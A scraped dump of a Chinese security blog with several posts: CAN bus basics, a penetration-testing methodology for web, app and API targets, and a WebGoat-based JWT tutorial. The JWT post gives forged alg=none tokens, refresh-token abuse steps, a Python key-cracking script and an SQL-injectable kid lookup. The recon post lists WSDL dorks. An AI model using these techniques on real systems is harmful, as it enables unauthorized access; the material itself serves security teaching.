两根双绞线组成总线，要求总线两端端接。在终端两端的两根电线上有一个120欧姆的电阻。如果模块不在总线的末端，则不必担心终止。作为一个可能窃听线路的人，你唯一需要担心的是，如果你为了嗅探线路而拆除了终端设备。 OBD-II连接器 许多车辆配备了一个OBD-II连接器，也被称为诊断链路连接器（DLC），它与车辆的内部网络进行通信。你通常会发现这个连接器在转向柱下或隐藏在仪表盘的其他地方，在一个相对容易接近的地方。你可能要四处寻找，但它的轮廓与图2-2中的相似。 在搜索电缆时很容易找到 CAN，因为它的静止电压为 2.5V。当信号进来时，它会增加或减少 1V（3.5V 或 1.5V）。 CAN 线贯穿车辆并连接 ECU 和其他传感器，它们始终采用双线对。如果连接万用表并检查车辆中的电线电压，您会发现它们将静止在 2.5V 或波动 1V。如果您发现一根电线以 2.5V 电压传输，几乎可以肯定是 CAN。 在图中，6号和14号引脚用于标准的高速CAN线（HS-CAN）。中速和低速通信发生在其他引脚上。一些汽车使用CAN的中速（MS-CAN）和低速（LS-CAN），但许多车辆对这些通信使用不同的协议。你会发现，并非所有的总线都通过OBD-II连接器暴露出来。你可以使用接线图来帮助定位额外的 &quot;内部 &quot;总线线路。 CAN总线数据包的布局 标准 每个CAN总线数据包包含四个关键元素： 仲裁ID：仲裁ID是一个广播信息，用于识别试图进行通信的设备的ID，尽管任何一个设备可以发送多个仲裁ID。如果两个CAN数据包同时沿总线发送，则仲裁ID较低的数据包获胜。 标识符扩展（IDE）：对于标准的CAN，该位总是0。 数据长度代码（DLC）：这是数据的大小，范围从0到8字节。 数据：这就是数据本身。一个标准的CAN总线数据包所携带的数据的最大尺寸可以达到8字节，但有些系统通过填充数据包来强制要求8字节。 拓展 扩展数据包与标准数据包一样，只是它们可以被串联起来以创建更长的ID。扩展数据包被设计成适合于标准的CAN格式，以保持向后的兼容性。因此，如果一个传感器不支持扩展数据包，那么如果另一个数据包在同一网络上传输扩展的CAN数据包，它就不会中断。 标准数据包在使用标志方面也与扩展数据包不同。当查看网络转储中的扩展数据包时，你会发现与标准数据包不同，扩展数据包使用替代远程请求（SRR）来代替远程传输请求（RTR），并将SSR设置为1。 他们也会将IDE设置为1，而且他们的数据包会有一个18位的标识符，这是标准11位标识符的第二部分。还有一些特定于某些制造商的CAN风格的协议，它们也是向后兼容标准CAN的，与扩展CAN的方式基本相同。 因为CAN总线数据包是广播的，所以同一网络上的所有控制器都能看到每个数据包，有点像以太网上的UDP。包集不携带有关哪个控制器(或攻击者)发送了什么的信息。因为任何设备都可以看到和传输数据包，所以总线上的任何设备都可以模拟任何其他设备。","categories":[{"name":"车联网基础","slug":"车联网基础","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"协议","slug":"协议","permalink":"https://j3f5.github.io/tags/%E5%8D%8F%E8%AE%AE/"}]},{"title":"漏洞发现-操作系统、WEB应用、APP应用与API接口服务安全","slug":"漏洞发现-操作系统、WEB应用、APP应用与API接口服务安全","date":"2023-06-08T06:00:59.000Z","updated":"2023-06-08T06:00:59.000Z","comments":true,"path":"articles/2023/06/08/漏洞发现-操作系统、WEB应用、APP应用与API接口服务安全/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/08/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/","excerpt":"","text":"概述 为什么要做漏洞发现？如果知道漏洞，就不用进行很多攻击，直接利用exp 漏洞类型&amp;危害条件？知道危害条件就可以先做好准备，例如得到低权限shell等等，看他是权限提升漏洞还是什么漏洞，就可以方便我们达成目标 如何做好未卜先知？做好信息搜集 此部分包含四个部分：如下 操作系统 一般都通过指纹来识别操作系统，还有一个特别古早的方法：Linux分大小写但是Windows不分 WEB应用 其实都差不多的思路，首先去找公开漏洞，不行就自己审计。 已知 CMS 如常见的 dedecms，discuz，wordpress 等源码结构，这种一般采用非框架类开发，但也有少部分采用的是框架类开发，针对此类源码程序的安全检测，我们要 利用公开的漏洞进行测试 如不存在可自行搭建环境，采用白盒代码审计自行挖掘。 开发框架 如常见的 thinkphp，spring，flask 等开发的源码程序，这种源码程序正常的安全测试思路： 先获取对应的开发框架信息(名字，版本)，通过公开的框架类安全问题进行测试 如不存在可采用白盒代码审计自行挖掘 未知 CMS 如常见的企业或个人内部程序源码，也可以是某 CMS 二次开发的源码结构，针对此类的源码程序测试思路： 能识别二次开发就按已知CMS 思路进行 不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜） 同样在有源码的情况下也可以进行代码审计自行挖掘 APP应用 一般来说，做了适应性的app都可以使用类似于web渗透的方法进行攻击，除非是采用特定的框架，采用非适应性（也就是用web浏览器打开不太行，不能做到适配，例如以此为开头的一般都是适应性的：m.xxx.com） API接口服务安全 分清api接口的类别，一般xml就是web service，而json就是restful。尽量找到wsdl的配置文件，看入口函数以及参数定义，这样子就能够构造数据包（使用postman也行，使用soapui啥的也行），构造完之后就是正常的渗透测试流程了，不太一样就是把这个包的参数都要自己摸索传输，而web传输我们抓包可以模仿一下~ 操作系统漏洞发现 学会使用一些工具：Nessus、Nmap、Goby。通过扫描的结果。 判断操作系统信息，版本、类型等 判断操作系统开放端口 查找历史漏洞，冲就完事了 WEB应用漏洞发现 识别WEB应用 看上面是分三类，所以主要是如何去测定这个是什么CMS或者是什么框架开发的。这个测定方法一般有： 手工 查看数据包。 查看头/源码，头里面可能会有特征值 http头。查看http响应报头的X-Powered-By字段来识别，可以通过netcat来识别，使用netcat 127.0.0.1 80对127.0.0.1主机的80端口web服务器框架进行识别。 Cookies。一些框架有固定的Cookies名称，这些名称一般情况都不会更改，例如zope3、cakephp、kohanasesson、laravel_session。 Html源代码。html源代码中包含注释、js、css等信息，通过访问这些信息来判断和确认cms系统框架。在源代码中常常会包含powered by、bulit upon、running等特征。 查看请求地址URL，请求地址目录有特征值 wp-content那就是wordpress的 特殊文件和文件夹 查看特殊文件（计算md5） robots.txt文件（例如dedecms的） favicon.ico、css、logo.ico、js等文件的md5 比对网站类型，通过收集CMS公开代码中的独有文件，这些文件一般轻易不会更改，通过爬虫对这些文件进行抓取并比对md5值，如果一样，则认为该系统匹配 查看端口：对于端口服务类，详细见下文 工具 whatweb wapplyze whatruns 参考：https://blog.51cto.com/simeon/2115190 整一个实战流程 首先识别一下这个网站是什么cms【即上面所说的】 看到了robots.txt，那么就直接往whatweb一搜就好，知道是什么cms之后就去查一下版本 知道CMS信息就去查历史漏洞，好像没有可以用的历史漏洞，那就看看后台地址是啥，看能不能爆破啥的 但是这个后台地址已经改掉了 就去查端口，看有什么应用，对应的漏洞 发现888、8888端口，那应该是宝塔waf应用，所以就去看看这个漏洞是啥 有一个漏洞 啥都没了，那就看看信息/代码泄露，去查看有什么配置信息，可以去看数据库有什么密码之类的 看到密码，直接登录，OK APP应用漏洞发现 反编译提取 URL 或抓包获取 URL，进行 WEB 应用测试，如不存在或走其他协议的情况下，需采用网络接口抓包进行数据获取，转至其他协议安全测试！ APP-&gt;WEB APP-&gt;其他 APP-&gt;逆向 WEB 抓包，其他协议抓包演示及说明 未逆向层面进行抓包区分各协议测试 逆向层面进行提取 APK 代码层面数据 参考： https://www.cnblogs.com/L0ading/p/12388928.html 所以渗透主要是：对URL进行抓取，对URL进行协议分类，然后分别进行攻击。可以使用web类攻击，也可以使用其他。 URL提取 Burp 然后搜索一下（showall）关键字，像id之类的。 需要注意的是： 由于这些app的链接都能在 电脑 上访问，但是访问之后的**请求数据包不一样！**所以，你需要在测试的时候先抓一个安卓数据包，然后在测试的时候（例如xray）改一下http头部。 如果你不用burp，可以在手机端安装：抓包精灵。跟burp的抓包功能差不多。但是功能不好用，不是什么数据都抓。 Apk Analyser 直接把APK放进去扫就行。 xray/awvs+burp联动扫描 设置如下： 手机端的wifi模块高级设置，设置代理转发到192.168.???.???的端口8888 burp设置代理捕获端口8888，然后设置转发端口6666 xray设置代理端口为6666，开启webscan： 1.\\xray.exe webscan --listen 127.0.0.1:6666 利用 上工具/自己按照web的方法使用 API接口服务漏洞发现 API接口渗透测试是通过用渗透测试的方法测试系统组件间接口的一种测试。接口渗透测试主要用于检测外部系统与系统之间以及内部各个子系统之间的交互点。测试的重点是要检查数据的交换，传递和控制管理过程，以及系统间的相互逻辑依赖关系等。 参考： https://blog.csdn.net/dzqxwzoe/article/details/129221428 https://xz.aliyun.com/t/2412 https://blog.gm7.org/个人知识库/01.渗透测试/03.思路技巧/03.api接口测试#接口文档的作用 漏洞挖掘关注点 信息搜集 在 API 渗透中，除了常规的域名、端口、服务器 banner 之类的信息外，API 本身所特有的信息在信息收集时需要关注。举例如下。 API 是否存在接口定义规范描述文件？【判断接口类型】如果存在，遵循的规范是什么？SOAP、Open API 2.0、Open API 3.0 还是 Graph QL？ API 是依赖什么语言实现的？Java、.NET、PHP、Python、Go 还是其他语言？【构造payload需要用到】 API 运行所依赖的组件是什么版本，是否存在已知漏洞？ 互联网上是否存在其泄露的 API Key 或证书？ API 是否存在多个版本？多个接入端？ 还有就是，需要提供两个信息：【最重要】 API地址 接口文档 其他的按需要求客户提供，比如接口示例、认证token、sign校验算法等 手工测试 在 API 渗透测试中，手工挖掘往往占有较大的比重。当采用手工挖掘时，以下事项是需要重点关注的。 认证和授权：对于 API 的认证鉴权机制，设计人员和研发人员往往认识不足，有的 API 调用甚至缺少认证与授权机制。比如令牌、HTTP 方法（GET，POST，PUT 和 DELETE 等）在进入服务器之前是否都经过了验证，OAuth 协议使用的正确性，无认证和授权的 API 是否可以任意调用。 输入验证：和其他类型的应用程序一样，对于输入的不可信是应用程序安全的基础，但研发人员常常因疏忽导致对输入缺少有效的验证。比如 XML 实体注入类型的攻击、不同的响应类型 application/json 与 application/xml。 数据编码：包含 JSON 格式的数据，容易导致反序列化漏洞或远程代码执行。 API 版本和影子 API：同一个 API 的不同版本或未在 API 规范文件中描述的 API，更容易发现安全漏洞。 测试接口类型： Webservice接口：走soap协议，请求报文和返回报文都是xml格式 HTTP API接口（常规客户）：走HTTP协议，通过路径来区分调用的方法，以RESTful风格为主，请求报文入参有多种形式，返回报文一般为json串，最常见的是get和post方法 接口测试分为web service和API接口测试,WebSocket接口等测试。可以使用该网址进行发包啥的：https://v7.apipost.cn/apis#/apis/run WebService Web Service服务也是一些包装过的接口而已，针对Web Service服务的渗透测试和对常规API渗透测试是一样的、只是，可以使用安全工具来辅助进行： 12345678910111213WebScarapSoapUIWCFStormSOA CleanerWSDiggerwsScannerWfuzzRESTClientBurpSuiteWS-AttackerZAPMetasploitWSDL Analyze SoapUI NG Pro作为Web Service的测试工具，Burp作为代理、监听SoapUI NG Pro用自己构造的payload报文打Web Service的流量报文，其中可以篡改对应的报文参数实现渗透测试。 可以查找： 1234567891011121314151617181920inurl:jws?wsdlinurl:asmx?wsdlinurl:aspx?wsdlinurl:ascx?wsdlinurl:ashx?wsdlinurl:dll?wsdlinurl:exe?wsdlinurl:php?wsdlinurl:pl?wsdlinurl:?wsdlfiletype:jwsfiletype:asmxfiletype:ascxfiletype:aspxfiletype:ashxfiletype:dllfiletype:exefiletype:phpfiletype:plfiletype:wsdl 测试手法 在得到api之后，有这个思路可以参考挖掘： 观察接口命名，采用驼峰命名法，是否存在其他不在接口文档的类似的测试接口，比如getUserInfos、getUserInfoByUid等 这个地方虽然参数是phone，那会不会后端模糊查询输入用户名也可以查询呢 查询任意用户信息的接口，应该存在鉴权机制 未授权访问 针对普通用户，每个人只能查询自己的信息 手机号进入后端查询用户的信息，肯定会进行数据库查询 是否可以模糊查询，比如1388888% 是否存在SQL注入 参数置空、过长或者输入特殊字符，会不会导致数据库报错抛出异常，获取一些敏感信息 补充知识点（信息的最大化） 前置知识：使用IP访问和使用域名访问有什么区别？ 假设：有域名abc.com对应域名123.123.123.123，其建立的文件夹目录为：d:\\www\\j3fffff\\ 使用域名访问则会访问目录：d:\\www\\j3fffff\\ 使用IP访问则会访问目录：d:\\www\\ 所以如果有文件：d:\\www\\old.zip，那么使用IP地址可以访问，而使用域名就不行。 IP 端口 web 在如BurpSuite这种代理工具中设定的过滤规则来筛选Web Service请求。比如“.dll?wsdl”、“.ashx?wsdl”、“.exe?wsdl”、“.php?wsdl”等 域名 web 子域名搜集，搜集的站点越多，目标越多，机会越多，可能越多！ 子域名搜集不仅仅局限于（子域名挖掘机）： 123www.jmlsd.combbs.jmlsd.comold.jmlsd.com 还可以 换后缀 看他以前有没有注册过这些域名（可以去https://www.west.cn/services/domain/看看有没有被注册），如果有，那么可能是同一家的，**并且挂载了老的系统或者其他业务**（可能是有漏洞的）： 1234www.jmlsd.com.cnwww.jmlsd.cnwww.jmlsd.netwww.jmlsd.org 还可以通过注册人反查他注册了什么公司 还可以通过特有信息，例如网站上写着：键美乐 ，那就查这个，可能会有其他域名： 1www.jmljy.com.cn 这个跟上面的是不一样的，他是“家园”，而不是“时代”。但是是一家公司的！","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"漏洞发现","slug":"漏洞发现","permalink":"https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"}]},{"title":"JAVA常见漏洞与代码审计基础","slug":"JAVA常见漏洞与代码审计基础","date":"2023-06-08T05:50:18.000Z","updated":"2023-06-08T05:50:18.000Z","comments":true,"path":"articles/2023/06/08/JAVA常见漏洞与代码审计基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/08/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/","excerpt":"","text":"概述 这一篇很长，鉴于之前已经分享过的漏洞内容，这里做一个Java漏洞的合集，里面的很多漏洞均已在之前的文章分析过，这里着重讲发现漏洞的trick，如何去操作，原理是怎么样的。进而，我们可以知道如何去审计一个系统。 这里已经默认安装了很多工具，不再一一讲。 此篇章将融合webgoat的代码审计、安全狗《JAVA代码审计（入门篇）》以及奇安信《网络安全：Java代码审计实战》整理而出。 注入漏洞类","categories":[{"name":"JAVA安全基础","slug":"JAVA安全基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"审计技巧","slug":"审计技巧","permalink":"https://j3f5.github.io/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/"}]},{"title":"JWT安全","slug":"JWT安全","date":"2023-06-07T06:14:47.000Z","updated":"2023-06-08T06:14:47.000Z","comments":true,"path":"articles/2023/06/07/JWT安全/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/07/JWT%E5%AE%89%E5%85%A8/","excerpt":"","text":"JWT概念 JSON Web Token（简称 JWT）是目前最流行的跨域认证解决方案。是一种认证授权机制。 组成部分 上面是使用base64编码的。头部和声明 部分都由JSON对象表示。头部 描述了应用于JWT的加密操作，以及JWT的附加属性，可以选择。声明代表一个JSON对象，其成员是JWT所传达的声明。 我们可以使用这个工具来解密：https://jwt.io/ 头部 Header 1234&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125; alg 是说明这个JWT 的签名使用的算法的参数，常见值用HS256（默认），HS512 等，也可以为None。HS256表示 HMAC SHA256。 typ 说明这个 token 的类型为 JWT 声明 Claims 令牌包含识别用户的要求，以及服务器满足请求所需的所有其他信息。请注意不要在令牌中存储敏感信息，并始终通过安全通道发送。例如解码得到： 1234567891011121314&#123;&quot;exp&quot;: 1416471934,&quot;user_name&quot;: &quot;user&quot;,&quot;scope&quot;: [&quot;read&quot;,&quot;write&quot;],&quot;authorities&quot;: [&quot;ROLE_ADMIN&quot;,&quot;ROLE_USER&quot;],&quot;jti&quot;: &quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;,&quot;client_id&quot;: &quot;my-client-with-secret&quot;&#125; JWT 固定参数有： iss：发行人 exp：到期时间 sub：主题 aud：用户 nbf：在此之前不可用 iat：发布时间 jti：JWT ID 用于标识该 JWT 签名 Signature 每个JWT令牌在发送给客户端之前至少应该被签名，如果一个令牌没有被签名，客户端应用程序将能够改变令牌的内容。签名规范在这里定义，你可以使用的具体算法在这里描述。基本上，你使用 HMAC与SHA-2函数 数字签名与RSASSA-PKCS1-v1_5/ECDSA/RSASSA-PSS 函数 来签名令牌。在执行任何其他操作之前验证签名是一个重要的步骤。【需要密钥！】 认证与获取JWT令牌 在这个流程中，你可以看到 用户用一个用户名和密码登录，认证成功后，服务器会返回。 服务器创建一个新的令牌并将这个令牌返回给客户端。 当客户端连续调用服务器时，它在 &quot;授权 &quot;头中附加了新的令牌。 服务器读取令牌并首先验证签名，验证成功后，服务器使用令牌中的信息来识别用户。 分类访问(Access)令牌与刷新(Refresh)令牌 通常有两种类型的令牌：访问令牌和刷新令牌。访问令牌用于对服务器进行 API 调用。访问令牌的生命周期有限，这就是刷新令牌的用武之地。一旦访问令牌不再有效，就可以向服务器发出请求，以通过出示刷新令牌来获取新的访问令牌。刷新令牌可以过期，但它们的寿命要长得多。 这解决了用户必须使用其凭据再次进行身份验证的问题。您是否应该使用刷新令牌和访问令牌取决于以下几点，在选择要使用的令牌时要牢记以下几点。 登录获取令牌：curl -X POST -H -d 'username=webgoat&amp;password=webgoat' localhost:8080/WebGoat/login 服务器返回令牌： 123456&#123; &quot;token_type&quot;:&quot;bearer&quot;, &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;, &quot;expires_in&quot;:10, &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;&#125; 如您所见，刷新令牌是一个随机字符串，服务器可以对其进行跟踪（在内存中或存储在数据库中），以便将刷新令牌与授予刷新令牌的用户相匹配。因此，在这种情况下，只要访问令牌仍然有效，我们就可以说是“无状态”会话，服务器端设置用户会话没有负担，令牌是自包含的。当访问令牌不再有效时，服务器需要查询存储的刷新令牌以确保令牌未以任何方式被阻止。 每当攻击者获得访问令牌时，它仅在一定时间内有效（比如 10 分钟）。然后攻击者需要刷新令牌来获取新的访问令牌。这就是刷新令牌需要更好保护的原因。也可以使刷新令牌无状态，但这意味着将更难查看用户是否撤销了令牌。服务器完成所有验证后，它必须向客户端返回一个新的刷新令牌和一个新的访问令牌。客户端可以使用新的访问令牌进行 API 调用。 无论选择哪种解决方案，您都应该在服务器端存储足够的信息以验证用户是否仍然可信。 存储 ip 地址 跟踪使用刷新令牌的次数（在访问令牌的有效时间窗口内多次使用刷新令牌可能表示奇怪的行为，你可以撤销所有令牌并让用户再次进行身份验证） 跟踪哪个访问令牌属于哪个刷新令牌，否则攻击者可能能够使用攻击者的刷新令牌为不同的用户获取新的访问令牌（参见 https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/ 以获得关于此攻击如何工作的精彩文章） 检查用户的 IP 地址或地理位置。如果您需要发出新的令牌，请检查位置是否仍然相同，如果不撤销所有令牌并让用户再次进行身份验证。 JWT的用处 在现代单页应用程序 (SPA) 中使用刷新令牌是否有意义？正如我们在关于存储令牌的部分中看到的那样，有两种选择： Web 存储 cookie 这意味着刷新令牌就在访问令牌旁边，因此如果访问令牌泄露，刷新令牌也可能会受到损害。大多数时候当然是有区别的。 访问令牌在您进行 API 调用时发送，刷新令牌仅在应获取新访问令牌时发送，这在大多数情况下是不同的端点。如果您最终在同一台服务器上，您可以选择仅使用访问令牌。 如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些杠杆，而不是一遍又一遍地检查访问令牌。仅在用户需要新的访问令牌时执行检查。当然可以只使用访问令牌。在服务器上，您存储的信息与您为刷新令牌存储的信息完全相同，请参阅上一段。这样您每次都需要检查令牌，但这可能适用于不同的应用程序。在存储刷新令牌以进行验证的情况下，保护这些令牌也很重要（至少使用哈希函数将它们存储在数据库中）。 有很多可用资源质疑使用 JWT 令牌进行客户端到服务器身份验证的用例。使用 JWT 令牌的最佳位置是服务器到服务器之间的通信。在普通的 Web 应用程序中，您最好使用普通的旧 cookie。 伪造签名令牌 伪造access_token攻击 截获数据包，发现 发现里面有个字段为：admin=false，改成true试试看。但是返回一个：token不正确，要检查。所以可能是签名出问题了，我们改了参数值，同步的签名也要进行更改的，但是我们没有密钥，所以后面的签名没办法更改。我们可以尝试更改头部，让它不用密钥加密就好啦，直接 none 走起！操作如下： 1234&#123;&quot;alg&quot;:&quot;none&quot;&#125;eyJhbGciOiJub25lIn0=&#123;&quot;iat&quot;:1686989890,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;eyJpYXQiOjE2ODY5ODk4OTAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ== 但是在HTTP数据传输的过程中，Base64编码中的=+/等特殊的符号通过URL容易产生歧义，所以产生了与URL兼容的Base64 URL编码，所以把=删掉，就构造好了：eyJhbGciOiJub25lIn0.eyJpYXQiOjE2ODY5ODk4OTAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ. 伪造authorization 这个的伪造点在字段：Authorization中。 1234567POST /WebGoat/JWT/refresh/checkout HTTP/1.1Host: 127.0.0.1:8080Content-Length: 0sec-ch-ua: &quot;Chromium&quot;;v=&quot;112&quot;, &quot;Google Chrome&quot;;v=&quot;112&quot;, &quot;Not:A-Brand&quot;;v=&quot;99&quot;sec-ch-ua-mobile: ?0Authorization: Bearer null... 我们有一个JWT token： 1eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q 第一种：更改时间 &amp;&amp; alg=none 分析得到这个token早就过期了，那么我们重新弄一下这个过期时间，然后把签名去掉。参考上面的。 1eyJhbGciOiJub25lIn0.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6IDE2ODYyOTAzMTgsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ. 第二种：使用refresh token 通常，在响应 JWT 身份验证/刷新请求时，你会得到如下所示的内容： 1&#123;&quot;code&quot;:0,&quot;data&quot;:&#123;&quot;access_token&quot;:&quot;XXX.YYY.ZZZ&quot;,&quot;access_token_expiration&quot;:&quot;Thursday, November 9th, 2017, 10:27:33 PM&quot;,&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;&#125; 此示例中的访问令牌将于10:27:33过期。通常，应用程序将使用刷新令牌在到期日期之前刷新/获取新的访问令牌。该请求将转到授权服务器，如下所示： 123456POST /auth/refresh HTTP/1.1Host: auth.example.comContent-Type: application/jsonAuthorization: Bearer XXX.YYY.ZZZ&#123;&quot;refresh_token&quot;:&quot;ABC123&quot;&#125; 当前访问令牌位于授权标头中，刷新令牌位于 POST 正文中。作为回报，您将获得一个全新的访问令牌、到期日期和刷新令牌。则我们伪造：使用我的刷新令牌刷新其他人的访问令牌 操作如下： F12查看流量，搜索：refresh_token，得到： 获取这个refresh_token，还有之前tom的token，抓包贴上（改URL，改content-type…），如下，就可刷新我们的token了，我们的token就不怕过期了！（得到URL的方式也很重要） 贴上我们刚获得的token，就OK了！ 代码审计 更改token细节——匹配 对比下面两个代码： 12345678910111213try &#123; Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken); Claims claims = (Claims) jwt.getBody(); String user = (String) claims.get(&quot;user&quot;); boolean isAdmin = Boolean.valueOf((String) claims.get(&quot;admin&quot;)); if (isAdmin) &#123; removeAllUsers(); &#125; else &#123; log.error(&quot;You are not an admin user&quot;); &#125;&#125; catch (JwtException e) &#123; throw new InvalidTokenException(e);&#125; 1234try &#123; Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken); Claims claims = (Claims) jwt.getBody();... 就是第2行代码不一样。主要涉及两个函数： parseClaimsJws： parse refresh token——生成 看到代码存在两个POSTMAPPING： 12@PostMapping(&#123;&quot;/JWT/refresh/checkout&quot;&#125;)@PostMapping(&#123;&quot;/JWT/refresh/newToken&quot;&#125;) 第一个是确认订单的，主要看第二个生成refresh token： 12345678910111213141516171819202122232425262728293031323334353637383940414243@PostMapping( value = &#123;&quot;/JWT/refresh/login&quot;&#125;, consumes = &#123;&quot;application/json&quot;&#125;, produces = &#123;&quot;application/json&quot;&#125;)@ResponseBodypublic ResponseEntity follow(@RequestBody(required = false) Map&lt;String, Object&gt; json) &#123; if (json == null) &#123; return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); &#125; else &#123; String user = (String)json.get(&quot;user&quot;); String password = (String)json.get(&quot;password&quot;); return &quot;Jerry&quot;.equalsIgnoreCase(user) &amp;&amp; &quot;bm5nhSkxCXZkKRy4&quot;.equals(password) ? ResponseEntity.ok(this.createNewTokens(user)) : ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); &#125;&#125;public ResponseEntity newToken(@RequestHeader(value = &quot;Authorization&quot;,required = false) String token, @RequestBody(required = false) Map&lt;String, Object&gt; json) &#123; if (token != null &amp;&amp; json != null) &#123; String user; String refreshToken; try &#123; Jwt&lt;Header, Claims&gt; jwt = Jwts.parser().setSigningKey(&quot;bm5n3SkxCX4kKRy4&quot;).parse(token.replace(&quot;Bearer &quot;, &quot;&quot;)); user = (String)((Claims)jwt.getBody()).get(&quot;user&quot;); refreshToken = (String)json.get(&quot;refresh_token&quot;); &#125; catch (ExpiredJwtException var6) &#123; user = (String)var6.getClaims().get(&quot;user&quot;); refreshToken = (String)json.get(&quot;refresh_token&quot;); &#125; if (user != null &amp;&amp; refreshToken != null) &#123; if (validRefreshTokens.contains(refreshToken)) &#123; validRefreshTokens.remove(refreshToken); return ResponseEntity.ok(this.createNewTokens(user)); &#125; else &#123; return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); &#125; &#125; else &#123; return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); &#125; &#125; else &#123; return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); &#125; &#125; 从上面可以看到，我们需要的Username为Jerry，密码是静态的。那么根据responsebody，我们构造请求包，这里知道是json格式：通过checkout的请求包，将conten-type改为json，然后构造参数，即可获得refresh token。 在/JWT/refresh/newToken接口，首先接收Authorization的值，进行jwt解码，得到user，然后再从json中得到refresh_token，如果refresh_token有效，则刷新access_token。 密钥爆破攻击 相对于上面，如果我们有密钥，那么我们就可以跟着修改签名，重新构造数据包进行攻击。我们可以发起离线的暴力破解发起对密钥的攻击。字典的话需要自己找。具体流程如下： 抓取到JWT token，分析得到如下： 将token放到破解脚本里面 123456789101112131415161718192021import jwtimport jsonalg = &quot;HS256&quot;jwt_str = &quot;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY4NjE4NzUwOCwiZXhwIjoxNjg2MTg3NTY4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.0TkftJKgV9kqnroqC_5QhsJdkxhl7x65m4ZPSA8Qq4M&quot;with open(&#x27;pass.txt&#x27;, encoding=&#x27;utf-8&#x27;) as f: for line in f: key_ = line.strip() try: jwt.decode(jwt_str, verify=True, key=key_, algorithms=&quot;HS256&quot;) print(&#x27;found key! --&gt; &#x27; + key_) break except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError): print(&#x27;found key! --&gt; &#x27; + key_) break except jwt.exceptions.InvalidSignatureError: continue else: print(&quot;key not found!&quot;) 找个好一点的字典直接开干 破解到之后，大概率token已经过期了，所以重新生成（但是密钥应该不会变），重新构造，例如得到密钥：shipping 综合利用 与sql注入结合 JWT由这个组成，看到kid不是自带的固定字段，所以可能有设么含义： 然后看到源代码： 123ResultSet rs = connection.createStatement().executeQuery(&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot; + kid + &quot;&#x27;&quot;);...var6 = TextCodec.BASE64.decode(rs.getString(1)); 从Header中获取“kid”直接插入sql查询语句中，存在SQL注入，将返回结果进行了base64解码作为KEY，然后进行解析。然后解析后 ，username参数等于”Tom”，则删除。 参考：https://www.cnblogs.com/yokan/p/15202333.html Node.js前端jw登录安全，伪造admin 注册用户登录，分析：controllers/api.js，看到需要我们伪造用户：admin 抓取数据包，进行解密修改后再加密，伪造登录即可 安全使用 使用 JWT 时的一些最佳实践： 固定算法，不允许客户端切换算法。 使用对称密钥对令牌进行签名时，请确保使用适当的密钥长度。 确保添加到令牌的声明不包含个人信息。如果您需要添加更多信息，也可以选择加密令牌。 